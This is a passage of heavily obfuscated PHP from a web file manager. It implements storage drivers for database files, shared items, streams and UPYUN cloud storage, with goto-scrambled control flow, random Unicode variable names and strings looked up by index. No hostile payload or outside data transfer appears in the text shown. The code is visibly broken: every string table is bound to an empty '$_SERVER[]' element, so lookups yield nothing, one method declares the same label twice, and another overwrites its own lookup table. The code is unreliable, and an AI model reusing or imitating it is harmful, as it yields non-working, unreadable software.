$a֯ = $Cڝ[$A۷[1210]][$cɴ]; if ($cɴ == count($Cڝ[$A۷[1210]]) - 1) { $aђ = $this->model->mkfile($aђ, $a֯, $D⭧, $b졭); break; } $aђ = $this->model->mkdir($aђ, $a֯, REPEAT_SKIP); } return $this->getPathOuter($aђ); } public function mkdir($A˒, $a鑓Ե = REPEAT_SKIP) { $dث =& $_SERVER[]; $b = $this->parse($A˒); $A˒ = $b[$dث[393]]; for ($Aʑ = 0; $Aʑ < count($b[$dث[1210]]); $Aʑ++) { $e = $b[$dث[1210]][$Aʑ]; $A˒ = $this->model->mkdir($A˒, $e, $a鑓Ե); } return $this->getPathOuter($A˒); } public function copyFile($b, $A켐, $cǝ = REPEAT_REPLACE) { $bѽ =& $_SERVER[]; $cǶϛ = $this->parse($A켐); $b섏» = $this->model->copy($b, $cǶϛ[$bѽ[393]], $cǝ, $cǶϛ[$bѽ[76]]); return $b섏» ? $this->getPathOuter($b섏») : !1; } public function moveFile($d, $B̳͙, $B˻ = REPEAT_REPLACE) { $f牟 =& $_SERVER[]; $e = $this->parse($B̳͙); $cµЇ = $this->model->move($d, $e[$f牟[393]], $B˻, $e[$f牟[76]]); return $cµЇ ? $this->getPathOuter($cµЇ) : !1; } public function copy($Eש, $E΋, $E = REPEAT_REPLACE) { $d݌ = $this->parse($E΋); $Cיʌ = $this->model->copy($Eש, $d݌[$_SERVER[][393]], $E); return $Cיʌ ? $this->getPathOuter($Cיʌ) : !1; } public function moveSameAllow() { } public function move($Cجʅ, $E, $cʄ = REPEAT_REPLACE) { $f׆ = $this->parse($E); $Cɷ = $this->model->move($Cجʅ, $f׆[$_SERVER[][393]], $cʄ); return $Cɷ ? $this->getPathOuter($Cɷ) : !1; } public function remove($eݢפ, $bыƟ = true) { return $this->model->remove($eݢפ, $bыƟ); } public function rename($CƤ, $e⼬) { $B̹կ = $this->model->rename($CƤ, $e⼬); return $B̹կ ? $this->getPathOuter($CƤ) : $B̹կ; } public function size($D򤢑) { $E؂ܝ = $this->infoSimple($D򤢑); return $E؂ܝ ? $E؂ܝ[$_SERVER[][78]] : 0; } public function infoSimple($b) { return $this->model->sourceInfo($b); } public function info($c) { return $this->infoParse($c); } public function infoAuth($F) { return $this->infoParse($F, !1, !0); } public function infoWithChildren($Eѿ) { return $this->infoParse($Eѿ, !0); } protected function infoParse($F, $Aʸ­ = false, $Cё­ = false) { if (!$Aʸ­) { return $this->model->pathInfo($F, $Cё­); } return $this->model->pathInfoMore($F); } public function infoFull($d) { $BĘϴ =& $_SERVER[]; $bɗ = explode($BĘϴ[8], $d); $EՅ = implode($BĘϴ[8], array_splice($bɗ, 1)); return $this->model->pathInfoByPath($bɗ[0], $EՅ); } public function hashSimple($A䞣) { $d疠 =& $_SERVER[]; $fƊް = $this->infoWithChildren($A䞣); return $fƊް[$d疠[164]][$d疠[171]]; } public function hashMd5($Eǒڱ) { $a =& $_SERVER[]; $Aȴ = $this->infoWithChildren($Eǒڱ); return $Aȴ[$a[164]][$a[170]]; } public function exist($a߬뱃) { $cŉߓ =& $_SERVER[]; $b = $this->parse($a߬뱃); if (!$b[$cŉߓ[76]]) { return $this->isFile($a߬뱃) || $this->isFolder($a߬뱃); } $eԆ = array($cŉߓ[394] => $b[$cŉߓ[393]], $cŉߓ[28] => $b[$cŉߓ[76]]); $Cο = $this->model->where($eԆ)->find(); return $Cο ? !0 : !1; } public function isFile($d) { $cɗ =& $_SERVER[]; $cؤݟן = $this->infoSimple($d); return $cؤݟן && $cؤݟן[$cɗ[403]] == $cɗ[87] ? !1 : !0; } public function isFolder($a̻) { $A荳 =& $_SERVER[]; $b㒪 = $this->infoSimple($a̻); return $b㒪 && $b㒪[$A荳[403]] == $A荳[87] ? !0 : !1; } public function listPath($AՋʍ, $Fߙ = false) { $eܦ =& $_SERVER[]; if ($AՋʍ == $eܦ[33]) { return !1; } $cޯ֪ = array($eܦ[394] => $AՋʍ); if ($Fߙ) { return $this->model->listSource($cޯ֪, -1); } return $this->model->listSource($cޯ֪); } public function has($EʇҒ, $e = false, $e = null) { $BП =& $_SERVER[]; $e = $this->infoWithChildren($EʇҒ); if ($e) { return array($BП[204] => $e[$BП[204]], $BП[203] => $e[$BП[203]]); } return $e ? $e[$BП[204]] : $e[$BП[203]]; } public function listAll($A) { $Dޤ즒 = IO::info($this->pathParse[$_SERVER[][76]]); if (!$Dޤ즒) { return array(); } return $this->model->listAll($A); } public function getContent($cݙ) { return $this->model->getContent($cݙ); } public function setContent($C, $fǭކ = '') { return $this->model->setContent($C, $fǭކ); } public function fileSubstr($F, $a·, $eǋ) { return $this->model->fileSubstr($F, $a·, $eǋ); } public function download($EК, $c؜ = '') { $d鎮 = get_path_father($c؜); $C믩 = get_path_this($c؜); $b = $this->model->fileInfoGet($EК); $D򉟌 = IO::copy($b[$_SERVER[][76]], $d鎮, !1, $C믩); return $D򉟌; } public function setModifyTime($b, $cǍ = '') { $b׃ =& $_SERVER[]; if (!$b) { return; } $this->model->where(array($b׃[410] => $b))->save(array($b׃[84] => $cǍ)); } public function upload($C⸅, $Fˡ͖, $F¿ = false, $fІ = REPEAT_REPLACE) { $d͊ =& $_SERVER[]; $F퓡 = $this->parse($C⸅); $F = $this->model->addFile($F퓡[$d͊[393]], $Fˡ͖, $F퓡[$d͊[76]], $F¿, $fІ); return $this->getPathOuter($F); } public function uploadFileByID($cڢ, $fɣ, $Bը) { $e隥˄ =& $_SERVER[]; $F՚ = $this->parse($cڢ); $D = $this->model->addFileByFileID($F՚[$e隥˄[393]], $fɣ, $F՚[$e隥˄[76]], $Bը); return $this->getPathOuter($D); } public function addFileByRemote($E½, $d, $D = array(), $dӂ = '', $aȇ) { $Bʹ =& $_SERVER[]; $E邃 = $this->parse($E½); $dӂ = empty($dӂ) ? $E邃[$Bʹ[76]] : $dӂ; $B݄ο = $this->model->addFileByRemote($E邃[$Bʹ[393]], $d, $dӂ, $D, $aȇ); return $this->getPathOuter($B݄ο); } public function uploadLink($b, $dφƠ = 0) { $eƯ =& $_SERVER[]; $Fӆ = $this->parse($b); $BҐ = _get($GLOBALS[$eƯ[7]], $eƯ[1211]); $bֻ = _get($GLOBALS[$eƯ[7]], $eƯ[1212]); $b = Model($eƯ[584])->createFileName($Fӆ[$eƯ[76]], $BҐ, $bֻ); return IO::uploadLink($b, $dφƠ); } public function fileNameAuto($E, $B, $Bۿ = REPEAT_REPLACE, $Eރ = false) { return $this->model->fileNameAuto($E, $B, $Bۿ, $Eރ); } public function fileNameExist($F, $cՎո) { return $this->model->fileNameExist($F, $cՎո); } protected function _fileOut($Fګφɾ, $B۞ȹ = false, $C㋕ = false, $eڍ = '', $Cն = false) { goto D䇌; C۪ۯ: if ($Cն) { return IO::fileOutServer($aۇ[$F[76]], $B۞ȹ, $D, $eڍ); } IO::fileOut($aۇ[$F[76]], $B۞ȹ, $D, $eڍ); goto f; CҺ: $aۇ = $this->model->fileInfoGet($Fګφɾ); $eڍ = $aۇ[$F[170]] ? $aۇ[$F[170]] : $eڍ; $D = isset($GLOBALS[$F[1214]]) ? $GLOBALS[$F[1214]] : $bᑳǝ[$F[28]]; goto C۪ۯ; D䇌: $F =& $_SERVER[]; $bᑳǝ = $this->model->sourceInfo($Fګφɾ); if ($bᑳǝ[$F[403]] == $F[87]) { header($F[1213]); die; } goto CҺ; f: } public function fileOut($f, $B֪ = false, $F׌릢 = false, $Bۮ = '') { $this->_fileOut($f, $B֪, $F׌릢, $Bۮ); } public function fileOutServer($Cȍ, $c = false, $Bӓ = false, $e = '') { $this->_fileOut($Cȍ, $c, $Bӓ, $e, !0); } protected function _fileOutImage($D, $DȻ = 250) { goto f; e: $a֥ʇ = $this->model->fileInfoGet($D); $a֥ʇ[$A̯[28]] = $bĊφ[$A̯[28]]; $a֥ʇ[$A̯[163]] = $bĊφ[$A̯[163]]; goto E; f: $A̯ =& $_SERVER[]; $bĊφ = $this->model->pathInfo($D); if ($bĊφ[$A̯[403]] == $A̯[87]) { show_json($A̯[1215] . $D, !1); } goto e; E: $GLOBALS[$A̯[1214]] = $a֥ʇ[$A̯[28]]; $GLOBALS[$A̯[162]] = $a֥ʇ; IO::fileOutImage($a֥ʇ[$A̯[76]], $DȻ); goto Cŧ; Cŧ: } public function fileOutImage($bﰙ̆, $e㱘 = 250) { $this->_fileOutImage($bﰙ̆, $e㱘); } public function fileOutImageServer($f񤉶, $bɪ = 250) { $this->_fileOutImage($f񤉶, $bɪ); } public function link($dح, $B = '') { $Aݕ = $this->model->fileInfoGet($dح); return IO::link($Aݕ[$_SERVER[][76]], $B); } protected function parse($c򍗼) { $A =& $_SERVER[]; if (strstr($c򍗼, $A[8]) === !1) { return array($A[412] => intval($c򍗼), $A[76] => $A[33], $A[1210] => array()); } $AѴ = explode($A[8], trim($c򍗼, $A[8])); if (count($AѴ) < 2) { show_tips($c򍗼 . $A[1216]); } return array($A[412] => intval($AѴ[0]), $A[76] => $AѴ[1], $A[1210] => array_slice($AѴ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($e֍) { $this->pathParse = $e֍; $this->model = Model($_SERVER[][1209]); } public function getPathOuter($Dã) { $c =& $_SERVER[]; if (!$Dã) { return $Dã; } $bʇ = $this->parse($Dã); return trim(KodIO::makeShare($this->pathParse[$c[393]], $bʇ[$c[393]]), $c[8]); } protected function infoParse($D̔, $Cײ = false, $f٩ = false) { $A =& $_SERVER[]; $DҒ = $this->pathParse[$A[393]]; $C˿ = trim($this->pathParse[$A[1065]], $A[8]); return Action($A[1217])->sharePathInfo($DҒ, $C˿); } public function infoFull($C𑤴) { $fݵ =& $_SERVER[]; $e = explode($fݵ[8], trim($C𑤴, $fݵ[8])); if (count($e) > 1) { $a® = implode($fݵ[8], array_splice($e, 1)); $b҉Һ = $this->model->pathInfoByPath($e[0], $a®); if (!$b҉Һ) { return !1; } $this->pathParse[$fݵ[1065]] = $b҉Һ[$fݵ[395]]; } return $this->infoParse($C𑤴); } public function listAll($b) { goto f̈݅; e: $aЅ = $this->model->listAll($b); $aϮ = Model($b[576])->getInfo($b[$b[468]]); $fﳒ = Action($b[1217]); goto fٛǮ; f̈݅: $b =& $_SERVER[]; $b = IO::info($this->pathParse[$b[76]]); if (!$b) { return array(); } goto e; fٛǮ: foreach ($aЅ as &$FŽ) { check_abort(); $FŽ[$b[85]] = $fﳒ->_shareItemeParse($FŽ[$b[85]], $aϮ); } unset($FŽ); return $aЅ; goto e; e: } } goto bÂ; b: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($E冚, $b = 0) { parent::__construct(); $this->source = $E冚; $this->sourceSize = $b; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($AՄ = false) { return $this->sourceSize; } public function getContent($aɋ = false) { return $this->fileSubstr($aɋ, 0, $this->sourceSize); } public function fileSubstr($fĈƒ = false, $F񝍐 = 0, $b = 0) { if (!$b) { $b = $this->sourceSize; } $c = $this->sourceSize - $F񝍐; if ($b >= $c) { $b = $c; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $F񝍐, $b); } if ($this->sourceType == self::TYPE_FILE) { if ($b <= 0) { return $_SERVER[][33]; } $b޻ = ftell($this->source); fseek_64($this->source, $b޻ + $F񝍐); $D = @fread($this->source, $b); fseek_64($this->source, $b޻); return $D; } } public function hashMd5($eٵ = false) { return md5($this->getContent()); } public static function hash($B, $fօ = 0) { $cՠ = new PathDriverStream($B, $fօ); return $cՠ->hashSimple($B); } public static function md5($fΗɵ, $d = 0) { $bγ = new PathDriverStream($fΗɵ, $d); return $bγ->hashMd5($fΗɵ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\72\57\57\x76\60\56\x61\x70\x69\x2e\x75\160\x79\x75\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($C蝠) { parent::__construct(); $this->_init($C蝠); } public function _init($E˪Ĺ) { $C =& $_SERVER[]; foreach ($E˪Ĺ as $E => $A) { if (isset($this->{$E})) { $this->{$E} = $A; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($C[1332] . LNG($C[1265])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($C, $eư􌋑 = "\107\x45\124") { $a =& $_SERVER[]; $EӨ = gmdate($a[1298]); $e̘֗ = base64_encode(hash_hmac($a[1333], "{$eư􌋑}\x26{$C}\46{$EӨ}", md5("{$this->userpass}"), !0)); $dʦ = array("\x41\165\164\x68\x6f\162\x69\172\x61\164\151\157\156\72\x55\120\131\x55\116\x20{$this->username}\x3a{$e̘֗}", "\x44\141\164\145\72{$EӨ}"); return $dʦ; } public function ussRequest($f, $e = "\107\105\124", $c = false, $e܌ = false, $aǥʉ = false) { goto fە; A⡄: if (!$B) { return array($a߭[1089] => !1, $a߭[1091] => $a߭[1334]); } if (strtolower($e) == $a߭[190] || in_array($B[$a߭[1089]], array($a߭[1192], $a߭[1335]))) { $c = $B[$a߭[1336]]; } else { $c = json_decode($B[$a߭[1091]], !0); if (!$c) { $c = $B[$a߭[1091]]; } else { if (!$B[$a߭[715]] && isset($c[$a߭[1337]])) { $c = $c[$a߭[1337]]; } } } return array($a߭[1089] => $B[$a߭[715]], $a߭[1091] => $c); goto A; Fڲ: $bՒ = $this->ussHeaders($eզ錵, $e); if ($e܌) { $bՒ = array_merge($bՒ, $e܌); } $B = url_request($this->endpoint . $eզ錵, $e, $c, $bՒ, $aǥʉ); goto A⡄; fە: $a߭ =& $_SERVER[]; $f = trim($f, $a߭[8]); $eզ錵 = "\57{$this->bucket}\x2f{$f}"; goto Fڲ; A: } public function mkfile($C, $B = '', $bѕ = REPEAT_RENAME) { if ($this->setContent($C, $B)) { return $this->getPathOuter($C); } return !1; } public function mkdir($b, $d = REPEAT_SKIP) { $eۍٿ =& $_SERVER[]; $Aᯒ = trim($b, $eۍٿ[8]); if ($this->_isFolder($Aᯒ)) { return $this->getPathOuter($Aᯒ); } $B̥鮦 = array($eۍٿ[1338]); $e᝗ʽ = $this->ussRequest($Aᯒ, $eۍٿ[224], !1, $B̥鮦); return $e᝗ʽ[$eۍٿ[1089]] ? $this->getPathOuter($Aᯒ) : !1; } public function copyFile($eސ, $aٓ) { $Eò =& $_SERVER[]; $E = array($Eò[1339] . "\x2f{$this->bucket}\57{$eސ}", $Eò[1340]); $e = $this->ussRequest($aٓ, $Eò[226], !1, $E); return $e[$Eò[1089]] ? !0 : $this->getPathOuter($aٓ); } public function moveFile($C, $b) { $fߝ =& $_SERVER[]; $BՎ = array($fߝ[1341] . "\57{$this->bucket}\x2f{$C}", $fߝ[1340]); $f؈͓ = $this->ussRequest($b, $fߝ[226], !1, $BՎ); return $f؈͓[$fߝ[1089]] ? !0 : $this->getPathOuter($b); } public function delFile($D֜Ǧ) { $c =& $_SERVER[]; $bˊ = $this->ussRequest($D֜Ǧ, $c[1342]); return $bˊ[$c[1089]] ? !0 : !1; } public function delFolder($aд) { goto Cѽ̟; Eǹ׊: return $cЂ´[$eϚ[1089]]; goto c񾒝΋; D: $e = $Fʙ = array(); $this->fileList($aд, $e, $Fʙ, !0); $this->listItemCache = !0; goto F; F: foreach ($Fʙ as $AÐ) { $cЂ´ = $this->ussRequest($AÐ[$eϚ[28]], $eϚ[1342]); if (!$cЂ´[$eϚ[1089]]) { return !1; } } foreach ($e as $B񥝸) { $cЂ´ = $this->ussRequest($B񥝸, $eϚ[1342]); if (!$cЂ´[$eϚ[1089]]) { return !1; } } $cЂ´ = $this->ussRequest($aд, $eϚ[1342]); goto Eǹ׊; Cѽ̟: $eϚ =& $_SERVER[]; if (!$this->exist($aд)) { return !0; } $this->listItemCache = !1; goto D; c񾒝΋: } public function rename($EԈ, $eᚆ湎) { if ($this->isFile($EԈ)) { $eᚆ湎 = get_path_father($EԈ) . $eᚆ湎; return $this->moveFile($EԈ, $eᚆ湎); } return $this->renameObject($EԈ, $eᚆ湎); } public function fileInfo($Eˡ, $Dݵ = false, $bܲ = array()) { goto b蚨; cͣ: $Dֻ섆[$Eݫ[194]] = $Dֻ섆[$Eݫ[84]] = 0; $Dֻ섆[$Eݫ[195]] = $Dֻ섆[$Eݫ[196]] = !0; if (empty($bܲ)) { $bܲ = $this->objectMeta($Eˡ); if (!$bܲ) { return $Dֻ섆; } } goto d꩟; b蚨: $Eݫ =& $_SERVER[]; $Dֻ섆 = array($Eݫ[28] => $this->pathThis($Eˡ), $Eݫ[76] => $this->getPathOuter($Eݫ[8] . $Eˡ), $Eݫ[29] => $Eݫ[193], $Eݫ[78] => isset($bܲ[$Eݫ[78]]) ? $bܲ[$Eݫ[78]] : 0, $Eݫ[168] => $this->ext($Eˡ)); if ($Dݵ) { return $Dֻ섆; } goto cͣ; d𜂘: return $Dֻ섆; goto dЂ; d꩟: $Dֻ섆[$Eݫ[194]] = intval($bܲ[$Eݫ[1343]]); $Dֻ섆[$Eݫ[84]] = intval($bܲ[$Eݫ[1344]]); $Dֻ섆[$Eݫ[78]] = $bܲ[$Eݫ[78]]; goto d𜂘; dЂ: } public function folderInfo($C, $a = false) { goto dЛ; Dŵ: $aي[$E[194]] = $aي[$E[84]] = 0; $aي[$E[195]] = $aي[$E[196]] = !0; if (empty($b)) { $b = $this->objectMeta($C); if (!$b) { return $aي; } } goto e͉ǋ; dЛ: $E =& $_SERVER[]; $aي = array($E[28] => $this->pathThis($C), $E[76] => $this->getPathOuter($E[8] . $C), $E[29] => $E[77]); if ($a) { return $aي; } goto Dŵ; e͉ǋ: $aي[$E[194]] = intval($b[$E[1343]]); $aي[$E[84]] = intval($b[$E[1344]]); return $aي; goto a; a: } private function listObjs($Fռ, $dӳ = 0, $dތ = 1000) { $A =& $_SERVER[]; $Aܰ = array($A[1345], $A[1346] . $dތ); if ($dӳ) { $Aܰ[] = $A[1347] . $dӳ; } $Aä = $this->ussRequest($Fռ, $A[228], !1, $Aܰ); return !$Aä[$A[1089]] ? !1 : $Aä[$A[1091]]; } private function fileList($bř, &$C, &$f, $e = false) { goto E߾; aك: if ($dě) { $this->cacheMethod($E֢Һ[199], $bř, !0); } goto dջ; E: $e = rtrim($bř, $E֢Һ[8]) . $E֢Һ[8]; $dě = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $bՃ = $this->listObjs($bř, $B, $cħ); if (!$bՃ) { return !1; } $B = isset($bՃ[$E֢Һ[1348]]) ? $bՃ[$E֢Һ[1348]] : $E֢Һ[33]; $Bś = isset($bՃ[$E֢Һ[1349]]) ? $bՃ[$E֢Һ[1349]] : array(); foreach ($Bś as $B) { $bԈ = $B[$E֢Һ[29]] == $E֢Һ[77] ? !0 : !1; $aѰ = ltrim($e . $B[$E֢Һ[28]], $E֢Һ[8]) . ($bԈ ? $E֢Һ[8] : $E֢Һ[33]); $F˗ = array($E֢Һ[28] => $aѰ, $E֢Һ[29] => $bԈ ? $E֢Һ[77] : $E֢Һ[193], $E֢Һ[78] => $B[$E֢Һ[335]], $E֢Һ[1344] => $B[$E֢Һ[1350]]); if ($dě) { $this->cacheMethod($E֢Һ[199], $aѰ, $bԈ); $this->cacheMethod($E֢Һ[200], $aѰ, $F˗); } if ($bԈ) { $C[] = $aѰ; if ($e) { $this->fileList($aѰ, $C, $f, $e); } continue; } $f[] = $F˗; } if (count($Bś) < $cħ) { break; } } goto aك; E߾: $E֢Һ =& $_SERVER[]; $B = $E֢Һ[33]; $cħ = 1000; goto E; dջ: } public function listPath($aʮ, $Eʙ = false) { $b͓ύ =& $_SERVER[]; $B = $EÐ瑄 = array(); $this->fileList($aʮ, $B, $EÐ瑄); foreach ($B as $eú => $CÅ) { $B[$eú] = $this->folderInfo($CÅ, $Eʙ); } foreach ($EÐ瑄 as $eú => $CÅ) { $EÐ瑄[$eú] = $this->fileInfo($CÅ[$b͓ύ[28]], $Eʙ, $CÅ); } return array($b͓ύ[75] => $B, $b͓ύ[74] => $EÐ瑄); } public function has($eɓߒ, $c埵 = false, $BЗ = true) { goto bÇ; E: while (!0) { check_abort(); $dڢ = $this->listObjs($eɓߒ, $Bʄ, $Eβ܎); if (!$dڢ) { return !1; } $Bʄ = isset($dڢ[$FҞۙ[1348]]) ? $dڢ[$FҞۙ[1348]] : $FҞۙ[33]; $dқ = isset($dڢ[$FҞۙ[1349]]) ? $dڢ[$FҞۙ[1349]] : array(); if (empty($dқ)) { break; } $dߵ = array_filter($dқ, function ($a) { $B =& $_SERVER[]; return $a[$B[29]] == $B[77]; }); $eͧ = count($dқ); $dߵ = count($dߵ); $d嘏 = $eͧ - $dߵ; if ($c埵) { $aՅ헬 += $dߵ; $d̘ += $d嘏; if ($eͧ < $Eβ܎) { break; } continue; } if ($BЗ) { if ($d嘏) { return !0; } } else { if ($dߵ) { return !0; } } if ($eͧ < $Eβ܎) { break; } } if ($c埵) { return array($FҞۙ[203] => $d̘, $FҞۙ[204] => $aՅ헬); } return !1; goto a۫; bÇ: $FҞۙ =& $_SERVER[]; $Bʄ = $FҞۙ[33]; $Eβ܎ = 500; goto BǍӹ; BǍӹ: $d̘ = 0; $aՅ헬 = 0; $F䋱 = rtrim($eɓߒ, $FҞۙ[8]) . $FҞۙ[8]; goto E; a۫: } public function listAll($b) { goto a׃; dű: $e䊻 = array(); foreach ($cĿ as $a) { $e䊻[$a[$EŔѵ[28]]] = $a[$EŔѵ[78]]; } foreach ($cˆ as $a) { if (is_string($a)) { $e䊻[$a] = 0; } } goto Fҷ؉; a׃: $EŔѵ =& $_SERVER[]; $cˆ = $cĿ = array(); $this->fileList($b, $cˆ, $cĿ, !0); goto dű; Fҷ؉: return $this->listAllFiles($b, array_keys($e䊻), $e䊻); goto E梅; E梅: } public function canRead($c) { return $this->exist($c) ? !0 : !1; } public function canWrite($A͝) { return $this->exist($A͝) ? !0 : !1; } public function getContent($d캽) { return $this->fileSubstr($d캽, 0, -1); } public function setContent($bѳ, $bƎ = '') { $dۼ =& $_SERVER[]; if (!$bƎ) { $bɯڈ = $this->ussRequest($bѳ, $dۼ[224]); return $bɯڈ[$dۼ[1089]]; } $dɫʃ = $this->tempFile($this->pathThis($bѳ)); file_put_contents($dɫʃ, $bƎ); if ($this->upload($bѳ, $dɫʃ)) { $this->tempFileRemve($dɫʃ); return !0; } return !1; } public function fileSubstr($d˘, $a, $b) { $f׹ =& $_SERVER[]; if (!($c = $this->link($d˘))) { return !1; } $FБ۸ = !1; if ($b > 0) { $EѠƜ = $a + $b - 1; $FБ۸ = array($f׹[1311] . $a . $f׹[440] . $EѠƜ); } $Aǵ = url_request($c, $f׹[228], !1, $FБ۸); return $Aǵ[$f׹[715]] ? $Aǵ[$f׹[1091]] : !1; } public function upload($c, $eƛ, $FƼ = false, $Aۨ = REPEAT_REPLACE) { goto e̻Қ; CƮ: if (!$Aǝ[$a՝߂[1089]]) { return !1; } $B٢ = $Aǝ[$a՝߂[1091]]; $b볤 = 0; goto Dћ; d⅖Ў: $Aǝ = $this->ussRequest($c, $a՝߂[226], !1, $b׌ߚ); return $Aǝ[$a՝߂[1089]] ? $this->getPathOuter($c) : !1; goto Aم; B捬: $Cő඗ = 1024 * 1024 * 10; $b׌ߚ = array($a՝߂[1352], $a՝߂[1353] . $EȨ, $a՝߂[1354], $a՝߂[1355] . $Cő඗); $Aǝ = $this->ussRequest($c, $a՝߂[226], !1, $b׌ߚ); goto CƮ; Dћ: $C؅Ǣ = $B٢[$a՝߂[1356]]; $b݈ = fopen($eƛ, $a՝߂[1262]); if (!$b݈) { return !1; } goto Bۍ投; Bۍ投: do { $F = $B٢[$a՝߂[1357]]; fseek_64($b݈, $b볤); $BنƬ = fread($b݈, $F); $e飠 = 0; do { $e飠++; $B٢ = $this->uploadPart($c, $B٢, $BنƬ); } while (!$B٢ && $e飠 < 3); if (!$B٢) { return !1; } $C؅Ǣ = $B٢[$a՝߂[1356]]; $b볤 += $F; } while ($C؅Ǣ != -1); fclose($b݈); $b׌ߚ = array($a՝߂[1358], $a՝߂[1359] . $B٢[$a՝߂[1360]], $a՝߂[1354]); goto d⅖Ў; e̻Қ: $a՝߂ =& $_SERVER[]; $EȨ = IO::size($eƛ); if ($EȨ <= 1024 * 1024 * 200) { $Eַ = array($a՝߂[1351] . $eƛ); $Aǝ = $this->ussRequest($c, $a՝߂[226], $Eַ); return $Aǝ[$a՝߂[1089]] ? $this->getPathOuter($c) : !1; } goto B捬; Aم: } private function uploadPart($a謠, $A܊, &$d) { $dϚž =& $_SERVER[]; $f = array($dϚž[1361], $dϚž[1359] . $A܊[$dϚž[1360]], $dϚž[1362] . $A܊[$dϚž[1356]], $dϚž[141] . $A܊[$dϚž[1357]]); $C՝ = $this->ussRequest($a謠, $dϚž[226], $d, $f); return !$C՝[$dϚž[1089]] ? $C՝[$dϚž[1089]] : $C՝[$dϚž[1091]]; } public function uploadFormData($Aʌଘ, $DՔ  = 3600) { return $this->uploadPolicy($Aʌଘ, $DՔ ); } public function multiUploadFormData($B, $DÃ = 3600) { $C˔ =& $_SERVER[]; $Fۢ = (int) $GLOBALS[$C˔[7]][$C˔[78]]; return $this->uploadPolicy($B, $DÃ, $Fۢ); } private function uploadPolicy($Fԝߍ, $E = 3600, $E͋ = 0) { goto Cƃڕ; eی: $B쟰 = base64_encode(hash_hmac($eá[1333], "\120\x4f\x53\124\46{$b֎ۛ}\46{$EƂ}\46{$cΆ}", md5("{$this->userpass}"), !0)); $cǺ = array($eá[1204] => $cΆ, $eá[1367] => "\x55\120\131\125\x4e\40{$this->username}\x3a{$B쟰}", $eá[175] => $this->endpoint . $b֎ۛ); return $cǺ; goto Bɰҫ; fԼ: $eא = array($eá[1363] => $this->bucket, $eá[1364] => $Fԝߍ, $eá[1365] => time() + $E, $eá[1366] => $EƂ); if ($E͋) { $eא[$eá[1278]] = $E͋; } $cΆ = base64_encode(json_encode($eא)); goto eی; Cƃڕ: $eá =& $_SERVER[]; $b֎ۛ = $eá[8] . $this->bucket; $EƂ = gmdate($eá[1298]); goto fԼ; Bɰҫ: } public function download($c, $D࿬) { goto Aݠ; d: fclose($d); return $D࿬; goto fթە; Aݠ: $eކ = IO::getPathInner(IO::mkfile($D࿬)); if (!($b = $this->link($c))) { return !1; } $aȯ = 0; goto cו; cו: $e𿜿 = 1024 * 200; $d = fopen($eކ, $_SERVER[][1317]); while (!0) { $a̮ = $this->fileSubstr($c, $aȯ, $e𿜿); if ($a̮ === !1) { return !1; } fwrite($d, $a̮); $aȯ += $e𿜿; if (strlen($a̮) < $e𿜿) { break; } } goto d; fթە: } public function link($Aƕ, $a = array()) { $DϨ =& $_SERVER[]; $Aƕ = trim($Aƕ, $DϨ[8]); if (!empty($this->token)) { $AҮ = strtotime(date($DϨ[1368])); $C޽ = substr(md5($this->token . $DϨ[282] . $AҮ . $DϨ[1369] . $Aƕ), 12, 8) . $AҮ; $a[] = $DϨ[1370] . $C޽; } $A = !empty($a) ? $DϨ[70] . implode($DϨ[282], $a) : $DϨ[33]; return $this->getHost() . $DϨ[8] . $Aƕ . $A; } public function fileOut($Dւ, $A = false, $CНи = false, $Eւ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Dւ, $A, $CНи, $Eւ); } if (!$CНи) { $CНи = $this->pathThis($Dւ); } $fיẇ = $A ? array($_SERVER[][1371] . rawurlencode($CНи)) : array(); $E = $this->link($Dւ, $fיẇ); $this->fileOutLink($E); } public function fileOutServer($E, $Aә = false, $D𶌓 = false, $aӧҌ = '') { parent::fileOut($E, $Aә, $D𶌓, $aӧҌ); } public function fileOutImage($EÂ, $c = 250) { $dڷƋ = $this->link($EÂ . $_SERVER[][1372] . $c); $this->fileOutLink($dڷƋ); } public function fileOutImageServer($eʞ, $Fԅ = 250) { parent::fileOutImage($eʞ, $Fԅ); } public function hashMd5($E) { $D؃̊ =& $_SERVER[]; $Aն = $this->_objectMeta($E); return isset($Aն[$D؃̊[208]]) ? $Aն[$D؃̊[208]] : !1; } public function size($C) { $A = $this->objectMeta($C); return $A ? $A[$_SERVER[][78]] : 0; } public function info($B) { if ($this->isFolder($B)) { return $this->folderInfo($B); } else { if ($this->isFile($B)) { return $this->fileInfo($B); } } return !1; } public function exist($cÍۈ) { return $this->isFile($cÍۈ) || $this->isFolder($cÍۈ); } public function isFile($Eɽ) { return !$this->isFolder($Eɽ) && $this->objectMeta($Eɽ); } public function isFolder($d) { return $this->cacheMethod($_SERVER[][199], $d); } protected function objectMeta($aͷ) { return $this->cacheMethod($_SERVER[][200], $aͷ); } protected function _objectMeta($Eď) { goto dߪ; DҜ: if (!$F[$Fߪ[1089]]) { return null; } $BԖ = isset($F[$Fߪ[1091]]) ? $F[$Fߪ[1091]] : array(); if (!isset($BԖ[$Fߪ[1374]])) { return null; } goto C; dߪ: $Fߪ =& $_SERVER[]; if ($Eď == $Fߪ[33] || $Eď == $Fߪ[8]) { return array(); } $F = $this->ussRequest($Eď, $Fߪ[1373]); goto DҜ; C: $bȸ瓽 = array($Fߪ[29] => isset($BԖ[$Fߪ[1374]]) ? $BԖ[$Fߪ[1374]] : null, $Fߪ[78] => isset($BԖ[$Fߪ[1375]]) ? $BԖ[$Fߪ[1375]] : null, $Fߪ[208] => isset($BԖ[$Fߪ[1376]]) ? $BԖ[$Fߪ[1376]] : null, $Fߪ[1343] => isset($BԖ[$Fߪ[1377]]) ? $BԖ[$Fߪ[1377]] : null); $bȸ瓽[$Fߪ[1344]] = isset($BԖ[$Fߪ[1378]]) ? strtotime($BԖ[$Fߪ[1378]]) : 